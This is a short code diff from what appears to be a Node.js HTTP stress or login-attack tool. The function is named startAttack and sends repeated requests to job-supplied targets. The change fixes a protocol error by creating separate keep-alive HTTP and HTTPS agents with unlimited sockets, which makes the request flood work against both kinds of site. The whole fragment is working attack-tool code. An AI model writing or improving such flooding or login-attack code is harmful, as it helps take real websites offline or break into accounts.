@@ -343,13 +343,19 @@ const startAttack = (job) => {
         // --- STRESS / LOGIN MODULE (HTTP) ---
         let targetUrl;
         try { targetUrl = new URL(job.target); } catch(e) { return; }
-        const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
+        
+        // Fix for ERR_INVALID_PROTOCOL: Create separate agents
+        const httpsAgent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
+        const httpAgent = new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
 
         const performRequest = () => {
             if (!running) return;
             if (!checkMemory()) return setTimeout(performRequest, 100); 
 
-            const lib = targetUrl.protocol === 'https:' ? https : http;
+            const isHttps = targetUrl.protocol === 'https:';
+            const lib = isHttps ? https : http;
+            const agent = isHttps ? httpsAgent : httpAgent;
+            
             const start = Date.now();
             let body = job.body;
             let method = job.method || 'GET';
